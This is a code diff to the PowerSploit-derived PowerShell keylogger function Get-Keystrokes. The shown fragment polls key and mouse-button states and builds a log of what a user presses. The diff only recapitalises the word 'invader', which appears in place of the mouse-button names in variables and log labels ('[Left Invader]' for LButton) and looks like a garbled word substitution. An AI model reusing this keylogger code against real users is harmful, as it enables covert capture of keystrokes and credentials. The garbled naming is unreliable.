@@ -3,7 +3,7 @@ function Get-Keystrokes {
 .SYNOPSIS
  
     Logs keys pressed, time and the active window (when changed).
-    Some modifications for invader by @harmj0y.
+    Some modifications for Invader by @harmj0y.
     
     PowerSploit Function: Get-Keystrokes
     Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
@@ -133,8 +133,8 @@ function Get-Keystrokes {
                 $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                 $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                 $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
-                $Leftinvader    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
-                $Rightinvader   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000
+                $LeftInvader    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
+                $RightInvader   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000
 
                 if ($LeftShift -or $RightShift) {$Outout += '[Shift]'}
                 if ($LeftCtrl  -or $RightCtrl)  {$Outout += '[Ctrl]'}
@@ -148,8 +148,8 @@ function Get-Keystrokes {
                 if ($RightArrow)   {$Outout += '[Right Arrow]'}
                 if ($UpArrow)      {$Outout += '[Up Arrow]'}
                 if ($DownArrow)    {$Outout += '[Down Arrow]'}
-                if ($Leftinvader)    {$Outout += '[Left invader]'}
-                if ($Rightinvader)   {$Outout += '[Right invader]'}
+                if ($LeftInvader)    {$Outout += '[Left Invader]'}
+                if ($RightInvader)   {$Outout += '[Right Invader]'}
 
                 #check for capslock
                 if ([Console]::CapsLock) {$Outout += '[Caps Lock]'}
